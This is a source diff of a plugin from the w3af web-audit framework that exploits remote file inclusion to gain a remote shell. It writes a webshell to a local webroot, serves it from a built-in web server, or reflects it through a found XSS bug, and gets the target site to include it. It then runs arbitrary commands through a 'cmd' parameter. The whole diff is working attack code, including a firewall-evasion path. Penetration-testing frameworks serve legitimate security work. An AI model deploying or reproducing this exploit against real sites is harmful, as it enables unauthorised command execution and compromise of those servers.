@@ -22,24 +22,30 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 
 # Common includes
-from core.data.fuzzer.fuzzer import *
+from core.data.fuzzer.fuzzer import createRandAlNum
 import core.controllers.outputManager as om
+
 # options
 from core.data.options.option import option
 from core.data.options.optionList import optionList
+
 from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
 import core.data.kb.knowledgeBase as kb
 import core.data.parsers.urlParser as urlParser
 from core.controllers.w3afException import w3afException
 from core.controllers.daemons.webserver import webserver
-import os,time
+from core.controllers.misc.homeDir import get_home_dir
 
 # Advanced shell stuff
 from core.data.kb.shell import shell as shell
-from plugins.attack.webshells.getShell import getShell
+import plugins.attack.payloads.payloads as payloads
 
 # Port definition
 import core.data.constants.w3afPorts as w3afPorts
+
+import os
+import time
+
 
 class remoteFileIncludeShell(baseAttackPlugin):
     '''
@@ -49,13 +55,17 @@ class remoteFileIncludeShell(baseAttackPlugin):
 
     def __init__(self):
         baseAttackPlugin.__init__(self)
+        
+        # Internal variables
         self._shell = None
-        self._webServer = None
+        self._web_server = None
+        self._xss_vuln = None
+        self._exploit_dc = None
         
         # User configured variables
-        self._listenPort = w3afPorts.REMOTEFILEINCLUDE
-        self._listenAddress = ''
-        self._useXssBug = False
+        self._listen_port = w3afPorts.REMOTEFILEINCLUDE
+        self._listen_address = '0.0.0.0'
+        self._use_XSS_vuln = False
         self._generateOnlyOne = True
 
     def fastExploit(self, url, method, data ):
@@ -69,59 +79,96 @@ class remoteFileIncludeShell(baseAttackPlugin):
         '''
         return self._shell
         
-    def canExploit( self, vulnToExploit=None):
+    def canExploit( self, vuln_to_exploit=None):
         '''
         Searches the kb for vulnerabilities that this plugin can exploit, this is overloaded from baseAttackPlugin because
         I need to test for xss vulns also. This is a "complex" plugin.
 
-        @parameter vulnToExploit: The id of the vulnerability to exploit.
+        @parameter vuln_to_exploit: The id of the vulnerability to exploit.
         @return: True if plugin knows how to exploit a found vuln.
         '''
-        if self._listenAddress == '' and not self._useXssBug:
-            raise w3afException('remoteFileIncludeShell plugin has to be correctly configured to use.')
+        if self._listen_address == '' and not self._use_XSS_vuln:
+            msg = 'remoteFileIncludeShell plugin has to be correctly configured to use.'
+            raise w3afException(msg)
         
-        rfiVulns = kb.kb.getData( 'remoteFileInclude' , 'remoteFileInclude' )
-        if vulnToExploit != None:
-            rfiVulns = [ v for v in rfiVulns if v.getId() == vulnToExploit ]
+        rfi_vulns = kb.kb.getData( 'remoteFileInclude' , 'remoteFileInclude' )
+        if vuln_to_exploit != None:
+            rfi_vulns = [ v for v in rfi_vulns if v.getId() == vuln_to_exploit ]
         
-        if len( rfiVulns ) == 0:
+        if len( rfi_vulns ) == 0:
             return False
         else:
-            if self._useXssBug:
+            # Ok, I have the vulnerability to exploit, but... is the plugin configured
+            # in such a way that exploitation is possible?
+            if self._use_XSS_vuln:
                 if len( kb.kb.getData( 'xss' , 'xss' ) ):
-                    for vuln in kb.kb.getData( 'xss' , 'xss' ):
-                        if not vuln['escapesSingle'] and not vuln['escapesDouble'] and not vuln['escapesLtGt']:
-                            self._xssVuln = vuln
-                            return True
+                    for xss_vuln in kb.kb.getData( 'xss' , 'xss' ):
+                        # Set the test string
+                        test_string = '<?#@!()&=?>'
+                        
+                        # Test if the current xss vuln works for us:
+                        function_reference = getattr( self._urlOpener , xss_vuln.getMethod() )
+                        data_container = xss_vuln.getDc()
+                        data_container[ xss_vuln.getVar() ] = test_string
+
+                        try:
+                            http_res = function_reference( xss_vuln.getURL(), str(data_container) )
+                        except:
+                            continue
                         else:
-                            om.out.error('remoteFileIncludeShell plugin is configured to use a XSS bug to exploit the RFI bug, but no XSS with the required parameters was found.')
-                            return False
+                            if test_string in http_res.getBody():
+                                self._xss_vuln = xss_vuln
+                                return True
+                    
+                    # Check If I really got something nice that I can use to exploit
+                    # if not, report it to the user
+                    if not self._xss_vuln:
+                        msg = 'remoteFileIncludeShell plugin is configured to use a XSS'
+                        msg += ' bug to exploit the RFI bug, but no XSS with the required'
+                        msg += ' parameters was found.'
+                        raise w3afException( msg )
+                        
+                # No XSS was found
                 else:
-                    om.out.error('remoteFileIncludeShell plugin is configured to use a XSS bug to exploit the RFI bug, but no XSS was found.')
-                    return False
+                    msg = 'remoteFileIncludeShell plugin is configured to use a XSS bug to'
+                    msg += ' exploit the RFI bug, but no XSS was found.'
+                    raise w3afException( msg )
             else:
                 # Using the good old webserver
                 return True
     
     def getAttackType(self):
+        '''
+        @return: The type of exploit, SHELL, PROXY, etc.
+        '''        
         return 'shell'
     
     def getVulnName2Exploit( self ):
+        '''
+        This method should return the vulnerability name (as saved in the kb) to exploit.
+        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
+        
+        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
+        
+        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
+        return 'osCommanding' in this method.
+        '''
         return 'remoteFileInclude'
         
-    def _generateShell( self, vuln ):
+    def _generateShell( self, vuln_obj ):
         '''
+        @parameter vuln_obj: The vuln to exploit.
         @return: A shell object based on the vuln that is passed as parameter.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verifyVuln( vuln ):
+        if self._verifyVuln( vuln_obj ):
             # Create the shell object
-            s = rfiShell( vuln )
-            s.setUrlOpener( self._urlOpener )
-            s.setCut( self._header, self._footer )
-            s.setWebServer( self._webServer )
-            s.setExploitDc( self._exploitDc )
-            return s
+            shell_obj = rfi_shell( vuln_obj )
+            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setCut( self._header, self._footer )
+            shell_obj.setWebServer( self._web_server )
+            shell_obj.setExploitDc( self._exploit_dc )
+            return shell_obj
         else:
             return None
 
@@ -132,142 +179,138 @@ class remoteFileIncludeShell(baseAttackPlugin):
         @return : True if vuln can be exploited.
         '''
         # Create the shell
-        filename = createRandAlpha( 7 )
         extension = urlParser.getExtension( vuln.getURL() )
         
-        # I get a list of tuples with fileContent and extension to use
-        shellList = getShell( extension )
+        # I get a list of tuples with file_content and extension to use
+        shell_list = payloads.get_webshells( extension )
         
-        for fileContent, realExtension in shellList:
+        for file_content, real_extension in shell_list:
             if extension == '':
-                extension = realExtension
+                extension = real_extension
 
-            urlToInclude = self._genURLToInclude( fileContent, extension )
-            
-            self._startWebServer()
+            url_to_include = self._gen_url_to_include( file_content, extension )
+
+            self._start_web_server()
             
             # Prepare for exploitation...
-            functionReference = getattr( self._urlOpener , vuln.getMethod() )
-            dc = vuln.getDc()
-            dc[ vuln.getVar() ] = urlToInclude
+            function_reference = getattr( self._urlOpener , vuln.getMethod() )
+            data_container = vuln.getDc()
+            data_container[ vuln.getVar() ] = url_to_include
 
             try:
-                httpRes = functionReference( vuln.getURL(), str(dc) )
+                http_res = function_reference( vuln.getURL(), str(data_container) )
             except:
-                successfullyExploited = False
+                successfully_exploited = False
             else:
-                successfullyExploited = self._defineCut( httpRes.getBody(), 'w3af' , exact=True )
-            
-            if successfullyExploited:
-                self._exploitDc = dc
-                return successfullyExploited
+                successfully_exploited = self._defineCut( http_res.getBody(), \
+                                                        payloads.SHELL_IDENTIFIER, exact=True )
+
+            if successfully_exploited:
+                self._exploit_dc = data_container
+                return successfully_exploited
             else:
                 # Remove the file from the local webserver webroot
-                self._clearWebServer( urlToInclude )
+                self._clear_web_server( url_to_include )
                 
         return False
     
-    def _genURLToInclude( self, fileContent, extension ):
+    def _gen_url_to_include( self, file_content, extension ):
         '''
         Generate the URL to include, based on the configuration it will return a 
         URL poiting to a XSS bug, or a URL poiting to our local webserver.
         '''
-        if self._useXssBug:
-            url = urlParser.uri2url( self._xssVuln.getURL() )
-            dc = self._xssVuln.getDc()
-            dc = dc.copy()
-            dc[ self._xssVuln.getVar() ] = fileContent
-            urlToInclude = url + '?' + str(dc)
-            return urlToInclude
+        if self._use_XSS_vuln:
+            url = urlParser.uri2url( self._xss_vuln.getURL() )
+            data_container = self._xss_vuln.getDc()
+            data_container = data_container.copy()
+            data_container[ self._xss_vuln.getVar() ] = file_content
+            url_to_include = url + '?' + str(data_container)
+            return url_to_include
         else:
             # Write the php to the webroot
             filename = createRandAlNum()
             try:
-                f = open( os.path.join('webroot' + os.path.sep, filename ) , 'w')
-                f.write( fileContent )
-                f.close()
+                file_handler = open( os.path.join(get_home_dir(), 'webroot', filename ) , 'w')
+                file_handler.write( file_content )
+                file_handler.close()
             except:
                 raise w3afException('Could not create file in webroot.')
             else:
-                urlToInclude = 'http://' + self._listenAddress +':' + str(self._listenPort) +'/' + filename
-                return urlToInclude
+                url_to_include = 'http://' + self._listen_address +':'
+                url_to_include += str(self._listen_port) +'/' + filename
+                return url_to_include
     
-    def _clearWebServer( self, urlToInclude ):
+    def _clear_web_server( self, url_to_include ):
         '''
         Remove the file in the webroot and stop the webserver.
-        '''
-        if not self._useXssBug and self._webServer:
-            self._webServer.stop()
-            # Remove the file
-            filename = urlToInclude.split('/')[-1:][0]
-            os.remove( os.path.join('webroot' + os.path.sep, filename ) )
-            self._webServer = None 
-    
-    def _startWebServer( self ):
-        if self._useXssBug:
-            return
-        if not self._webServer:
-            self._webServer = webserver( self._listenAddress, self._listenPort , 'webroot' + os.path.sep)
-            self._webServer.start2()
-            time.sleep(0.2) # wait for webserver thread to start
-            
-    def getOptionsXML(self):
-        '''
-        This method returns a XML containing the Options that the plugin has.
-        Using this XML the framework will build a window, a menu, or some other input method to retrieve
-        the info from the user. The XML has to validate against the xml schema file located at :
-        w3af/core/ui/userInterface.dtd
         
-        @return: XML with the plugin options.
-        ''' 
-        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
-        <OptionList>\
-            <Option name="listenAddress">\
-                <default>'+str(self._listenAddress)+'</default>\
-                <desc>IP address that the webserver will use to receive requests</desc>\
-                <type>string</type>\
-                <help>w3af runs a webserver to serve the files to the target web app \
-                when doing remote file inclusions. This \
-                setting configures on what IP address the webserver is going to listen.</help>\
-            </Option>\
-            <Option name="listenPort">\
-                <default>'+str(self._listenPort)+'</default>\
-                <desc>Port that the webserver will use to receive requests</desc>\
-                <help>w3af runs a webserver to serve the files to the target web app \
-                when doing remote file inclusions. This \
-                setting configures on what IP address the webserver is going to listen.</help>\
-                <type>integer</type>\
-                <help></help>\
-            </Option>\
-            <Option name="useXssBug">\
-                <default>'+str(self._useXssBug)+'</default>\
-                <desc>Instead of including a file in a local webserver; include the result of exploiting a XSS bug.</desc>\
-                <type>boolean</type>\
-                <help></help>\
-            </Option>\
-            <Option name="generateOnlyOne">\
-                <default>'+str(self._generateOnlyOne)+'</default>\
-                <desc>If true, this plugin will try to generate only one shell object.</desc>\
-                <type>boolean</type>\
-            </Option>\
-        </OptionList>\
-        '
+        PLEASE NOTE: This is duplicated code!! see the same note above.
+        '''
+        if not self._use_XSS_vuln and self._web_server:
+            self._web_server.stop()
+            # Remove the file
+            filename = url_to_include.split('/')[-1:][0]
+            os.remove( os.path.join(get_home_dir(), 'webroot', filename ) )
+            self._web_server = None 
+    
+    def _start_web_server( self ):
+        '''
+        Start the web server if needed.
+        '''
+        if self._use_XSS_vuln:
+            return
+        if not self._web_server:
+            webroot_path = os.path.join( get_home_dir(), 'webroot')
+            self._web_server = webserver( self._listen_address, self._listen_port, webroot_path)
+            self._web_server.start2()
+            time.sleep(0.2) # wait for webserver thread to start
+    
+    def getOptions( self ):
+        '''
+        @return: A list of option objects for this plugin.
+        '''
+        d1 = 'IP address that the webserver will use to receive requests'
+        h1 = 'w3af runs a webserver to serve the files to the target web app'
+        h1 += ' when doing remote file inclusions. This setting configures on what IP address the'
+        h1 += ' webserver is going to listen.'
+        o1 = option('listenAddress', self._listen_address, d1, 'string', help=h1)
+
+        d2 = 'Port that the webserver will use to receive requests'
+        h2 = 'w3af runs a webserver to serve the files to the target web app'
+        h2 += ' when doing remote file inclusions. This setting configures on what IP address'
+        h2 += ' the webserver is going to listen.'
+        o2 = option('listenPort', self._listen_port, d2, 'integer', help=h2)
+        
+        d3 = 'Instead of including a file in a local webserver; include the result of'
+        d3 += ' exploiting a XSS bug.'
+        o3 = option('useXssBug', self._use_XSS_vuln, d3, 'boolean')
+        
+        d4 = 'If true, this plugin will try to generate only one shell object.'
+        o4 = option('generateOnlyOne', self._generateOnlyOne, d4, 'boolean')
+        
+        ol = optionList()
+        ol.add(o1)
+        ol.add(o2)
+        ol.add(o3)
+        ol.add(o4)
+        return ol
 
     def setOptions( self, optionsMap ):
         '''
         This method sets all the options that are configured using the user interface 
-        generated by the framework using the result of getOptionsXML().
+        generated by the framework using the result of getOptions().
         
         @parameter optionsMap: A map with the options for the plugin.
         @return: No value is returned.
         ''' 
-        self._listenAddress = optionsMap['listenAddress']
-        self._listenPort = optionsMap['listenPort']
-        self._useXssBug = optionsMap['useXssBug']
-        self._generateOnlyOne = optionsMap['generateOnlyOne']
+        self._listen_address = optionsMap['listenAddress'].getValue()
+        self._listen_port = optionsMap['listenPort'].getValue()
+        self._use_XSS_vuln = optionsMap['useXssBug'].getValue()
+        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()
         
-        if self._listenAddress == '' and not self._useXssBug:
-            raise w3afException('remoteFileIncludeShell plugin has to be correctly configured to use.')
+        if self._listen_address == '' and not self._use_XSS_vuln:
+            om.out.error('remoteFileIncludeShell plugin has to be correctly configured to use.')
+            return False
             
     def getPluginDeps( self ):
         '''
@@ -290,28 +333,52 @@ class remoteFileIncludeShell(baseAttackPlugin):
         @return: A DETAILED description of the plugin functions and features.
         '''
         return '''
-        This plugin exploits remote file inclusion vulnerabilities and returns a remote shell. The exploitation can be
-        done using a more classic approach, in which the file to be included is hosted on a webserver that the plugin
-        runs, or a nicer approach, in which a XSS bug on the remote site is used to generate the remote file to be included.
-        Both ways work and return a shell, but the one that uses XSS will work even when a restrictive firewall is configured
-        at the remote site.
+        This plugin exploits remote file inclusion vulnerabilities and returns a remote shell. The 
+        exploitation can be done using a more classic approach, in which the file to be included 
+        is hosted on a webserver that the plugin runs, or a nicer approach, in which a XSS bug on 
+        the remote site is used to generate the remote file to be included. Both ways work and 
+        return a shell, but the one that uses XSS will work even when a restrictive firewall is 
+        configured at the remote site.
         
-        Three configurable parameters exist:
+        Four configurable parameters exist:
             - listenAddress
             - listenPort
             - useXssBug
             - generateOnlyOne
         '''
         
-class rfiShell(shell):
-    def setExploitDc( self, eDc ):
-        self._exploitDc = eDc
+class rfi_shell(shell):
+    
+    def __init__(self, vuln):
+        '''
+        Create the obj
+        '''
+        shell.__init__(self, vuln)
+        
+        self._exploit_dc = None
+        self._web_server = None
+    
+    def setExploitDc( self, e_dc ):
+        '''
+        Save the exploit data container, that holds all the parameters for a successful exploitation
+        
+        @parameter e_dc: The exploit data container.
+        '''
+        self._exploit_dc = e_dc
     
     def getExploitDc( self ):
-        return self._exploitDc
+        '''
+        Get the exploit data container.
+        '''
+        return self._exploit_dc
     
-    def setWebServer( self, webserverInstance ):
-        self._webServer = webserverInstance
+    def setWebServer( self, webserver_instance ):
+        '''
+        Set the web server instance to use
+        
+        @parameter webserver_instance: The obj.
+        '''
+        self._web_server = webserver_instance
     
     def _rexec( self, command ):
         '''
@@ -321,38 +388,45 @@ class rfiShell(shell):
         @parameter command: The command to send ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        eDc = self.getExploitDc()
-        eDc = eDc.copy()
-        eDc[ 'cmd' ] = urllib.quote_plus( command )
+        e_dc = self.getExploitDc()
+        e_dc = e_dc.copy()
+        e_dc[ 'cmd' ] = command
         
-        functionReference = getattr( self._urlOpener , self.getMethod() )
+        function_reference = getattr( self._urlOpener , self.getMethod() )
         try:
-            httpRes = functionReference( self.getURL(), str(eDc) )
-        except:
-            return 'Unexpected response from the remote web application:' + str(e)
+            http_res = function_reference( self.getURL(), str(e_dc) )
+        except w3afException, w3:
+            return 'Exception from the remote web application:' + str(w3)
+        except Exception, e:
+            return 'Unhandled exception from the remote web application:' + str(e)
         else:
-            return self._cut( httpRes.getBody() )
+            return self._cut( http_res.getBody() )
         
     def end( self ):
+        '''
+        Finish execution, clean-up, clear the local web server.
+        '''
         om.out.debug('Remote file inclusion shell is cleaning up.')
         try:
-            self._clearWebServer( self.getExploitDc()[ self.getVar() ] )
+            self._clear_web_server( self.getExploitDc()[ self.getVar() ] )
         except Exception, e:
             om.out.error('Remote file inclusion shell cleanup failed with exception: ' + str(e) )
         else:
             om.out.debug('Remote file inclusion shell cleanup complete.')
     
     def getName( self ):
-        return 'rfiShell'
+        return 'rfi_shell'
 
-    def _clearWebServer( self, urlToInclude ):
+    def _clear_web_server( self, url_to_include ):
         '''
-        TODO: This is duplicated code!! see above.
+        Remove the file in the webroot and stop the webserver.
+        
+        PLEASE NOTE: This is duplicated code!! see the same note above.
         '''
-        if self._webServer:
-            self._webServer.stop()
+        if self._web_server:
+            self._web_server.stop()
             # Remove the file
-            filename = urlToInclude.split('/')[-1:][0]
-            os.remove( os.path.join('webroot' + os.path.sep, filename ) )
-            self._webServer = None
+            filename = url_to_include.split('/')[-1:][0]
+            os.remove( os.path.join( get_home_dir(), 'webroot', filename ) )
+            self._web_server = None
             
